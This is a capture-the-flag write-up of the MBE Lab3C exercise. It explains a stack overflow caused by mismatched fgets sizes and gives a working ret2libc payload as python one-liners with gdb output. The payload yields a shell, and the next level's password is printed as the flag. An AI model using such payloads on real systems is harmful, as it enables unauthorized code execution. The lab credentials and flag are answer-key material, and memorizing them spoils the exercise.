---
title: "Разбор Lab3C (легко)"
permalink: /writeups/mbe/lab3c/
excerpt: "Разбор Lab3C."
---

---
MBE's **Lab03** is focused on writing shellcode. First, log into the Lab03 as **Lab3C** (`lab3C:lab03start`) and go to the challenges folder:

```shell
$ ssh lab3C@<VM_IP>
$ cd /levels/lab03/
```

Let's try to execute the program:

```shell
lab3C@warzone:/levels/lab03$ ./lab3C 
********* ADMIN LOGIN PROMPT *********
Enter Username: Admin
verifying username....

nope, incorrect username...
```

It seems that we just need to provide a valid username to get through.

## Анализ исходного кода

Let's check the code in order to see if we can find any information about this username.

```c
char a_user_name[100];

int verify_user_name()
{
    puts("verifying username....\n");
    return strncmp(a_user_name, "rpisec", 6);
}

int verify_user_pass(char *a_user_pass)
{
    return strncmp(a_user_pass, "admin", 5);
}

int main()
{
    char a_user_pass[64] = {0};
    int x = 0;

    /* prompt for the username - read 100 byes */
    printf("********* ADMIN LOGIN PROMPT *********\n");
    printf("Enter Username: ");
    fgets(a_user_name, 0x100, stdin);

    /* verify input username */
    x = verify_user_name();
    if (x != 0){
        puts("nope, incorrect username...\n");
        return EXIT_FAILURE;
    }

    /* prompt for admin password - read 64 bytes */
    printf("Enter Password: \n");
    fgets(a_user_pass, 0x64, stdin);

    /* verify input password */
    x = verify_user_pass(a_user_pass);
    if (x == 0 || x != 0){
        puts("nope, incorrect password...\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
```

Unlike the previous levels, we don't have any function using a call to *system()*. Obviously, we will need to find a vulnerability and write our own *shellcode*. In this code, if you take a look at the comments, there are false assertions like:
- `/* prompt for the username - read 100 byes */`
- `/* prompt for admin password - read 64 bytes */`

Why? take a look at the code:

```c
// Read 256 bytes not 100. 0x100 (hex) = 256 (dec).
fgets(a_user_name, 0x100, stdin);
// Read 100 bytes not 64. 0x64 (hex) = 100 (dec).
fgets(a_user_pass, 0x64, stdin);
```

It means that we could overflow the following variables:

```c
char a_user_name[100];
char a_user_pass[64] = {0};
```

Here, we will overflow the **a_user_pass** variables, not **a_user_name**. Why? That's because **a_user_name** is outside the scope of any functions and will be allocated in the **.bss** section of the ELF executable and not on the stack.

Unix-like systems initialize the **.bss** section to zero, allowing C and C++ statically-allocated variables initialized to values represented with all bits zero to be put in the bss segment. Let me show you. First we check where *.bss* is located:

```shell
lab3C@warzone:/levels/lab03$ readelf -S lab3C | grep .bss
There are 30 section headers, starting at offset 0xd40:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al

...[snip]...

  [25] .bss              NOBITS          08049c20 000c14 000084 00  WA  0   0 32
```

Then, we place a breakpoint on the *verify_user_name()* function:

```nasm
lab3C@warzone:/levels/lab03$ gdb -q lab3C 
Reading symbols from lab3C...(no debugging symbols found)...done.
gdb-peda$ break verify_user_name 
Breakpoint 1 at 0x8048743
gdb-peda$ run
Starting program: /levels/lab03/lab3C 
********* ADMIN LOGIN PROMPT *********
Enter Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048743 in verify_user_name ()

// Then, we check the content of bss...
gdb-peda$ x/30x 0x08049c20
0x8049c20 <stdin@@GLIBC_2.0>:	0xb7fcdc20	0x00000000	0x00000000	0x00000000
0x8049c30:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049c40 <a_user_name>:	0x41414141	0x41414141	0x41414141	0x41414141
0x8049c50 <a_user_name+16>:	0x41414141	0x41414141	0x41414141	0x41414141
0x8049c60 <a_user_name+32>:	0x41414141	0x41414141	0x41414141	0x41414141
0x8049c70 <a_user_name+48>:	0x41414141	0x41414141	0x0a414141	0x00000000
0x8049c80 <a_user_name+64>:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049c90 <a_user_name+80>:	0x00000000	0x00000000
gdb-peda$ 
```

See, that's why even if we overflow the username variable, it won't help us to overwrite the return address as the content will not be placed on the stack.

So, as we know the right username (*rpisec*), we can overflow the **a_user_pass** variable. Let's do that in memory.

## Динамический анализ

Now, it should be easy to overwrite a return address. Again, we can use the *pattern* feature of PEDA to find out at which offsec we will overwrite the return address.

```nasm
lab3C@warzone:/levels/lab03$ gdb lab3C 

gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

gdb-peda$ run
Starting program: /levels/lab03/lab3C 
********* ADMIN LOGIN PROMPT *********
Enter Username: rpisec  
verifying username....

Enter Password: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x41413341 ('A3AA')
ECX: 0xb7fd8000 ("\nope, incorrect password...\n *********\n")
EDX: 0xb7fce898 --> 0x0 
ESI: 0x0 
EDI: 0x65414149 ('IAAe')
EBP: 0x41344141 ('AA4A')
ESP: 0xbffff700 ("fAA5AAKAAgAA6AA")
EIP: 0x41414a41 ('AJAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414a41
[------------------------------------stack-------------------------------------]
0000| 0xbffff700 ("fAA5AAKAAgAA6AA")
0004| 0xbffff704 ("AAKAAgAA6AA")
0008| 0xbffff708 ("AgAA6AA")
0012| 0xbffff70c --> 0x414136 ('6AA')
0016| 0xbffff710 --> 0x1 
0020| 0xbffff714 --> 0xbffff794 --> 0xbffff8b4 ("/levels/lab03/lab3C")
0024| 0xbffff718 --> 0xbffff734 --> 0x1f689e16 
0028| 0xbffff71c --> 0x8049c04 --> 0xb7e3c990 (<__libc_start_main>:	push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414a41 in ?? ()
gdb-peda$ pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 80
EBX+0 found at offset: 68
EDI+0 found at offset: 72
EBP+0 found at offset: 76
Registers point to pattern buffer:
[ESP] --> offset 84 - size ~15

...[snip]...
```

We know that we overwrite the return address at the offset **80**. We can create a quick proof of concept for ease of use.

```nasm
gdb-peda$ r < <(python -c 'print "rpisec\n" + 80 * "\x41" + "\x42\x42\x42\x42" + 10 * "\x42"')
Starting program: /levels/lab03/lab3C < <(python -c 'print "rpisec\n" + 80 * "\x41" + "\x42\x42\x42\x42" + 10 * "\x42"')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x41414141 ('AAAA')
ECX: 0xb7fd8000 ("\nope, incorrect password...\nername....\n")
EDX: 0xb7fce898 --> 0x0 
ESI: 0x0 
EDI: 0x41414141 ('AAAA')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff700 ("BBBBBBBBBB\n")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff700 ("BBBBBBBBBB\n")
0004| 0xbffff704 ("BBBBBB\n")
0008| 0xbffff708 --> 0xa4242 ('BB\n')
0012| 0xbffff70c --> 0xb7feccea (<call_init+26>:	add    ebx,0x12316)
0016| 0xbffff710 --> 0x1 
0020| 0xbffff714 --> 0xbffff794 --> 0xbffff8b4 ("/levels/lab03/lab3C")
0024| 0xbffff718 --> 0xbffff734 --> 0x7722fb53 
0028| 0xbffff71c --> 0x8049c04 --> 0xb7e3c990 (<__libc_start_main>:	push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

To finish this one, we'll stick to a classic exploit technique: **ret2libc**. The idea is to call the *system()* function by passing as an argument the command we want to execute, like **/bin/bash**. 

However, *system()* expect also the return address as an argument, but here, we don't really care so we'll push some junk on the stack. First, let's find a **/bin/bash** pointer and the *system()* function.

```nasm
gdb-peda$ searchmem "/bin/bash"
Searching for '/bin/bash' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0xbffff8df ("/bin/bash")
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
```

Good. Now, let's create the exploit.

```nasm
gdb-peda$ r < <(python -c 'print "rpisec\n" + 80 * "\x41" + "\x90\x31\xe6\xb7" + "JUNK" + "\x24\x3a\xf8\xb7"')
Starting program: /levels/lab03/lab3C < <(python -c 'print "rpisec\n" + 80 * "\x41" + "\x90\x31\xe6\xb7" + "JUNK" + "\x24\x3a\xf8\xb7"')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

[New process 2753]
process 2753 is executing new program: /bin/dash
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.19.so...done.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.
[New process 2754]
process 2754 is executing new program: /bin/dash
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.19.so...done.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.
[Inferior 3 (process 2754) exited normally]
Warning: not running or target is remote
```

Bingo! It seems to be working :)

## Решение

Now we can exploit the vulnerability outside `gdb`:

```shell
lab3C@warzone:/levels/lab03$ (python -c 'print "rpisec\n" + 80 * "\x41" + "\x90\x31\xe6\xb7" + "JUNK" + "\x24\x3a\xf8\xb7"'; cat;) | ./lab3C
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
lab3B
cat /home/lab3B/.pass
th3r3_iz_n0_4dm1ns_0n1y_U!
```

You can go to the next [challenge](/writeups/mbe/lab3b/)!
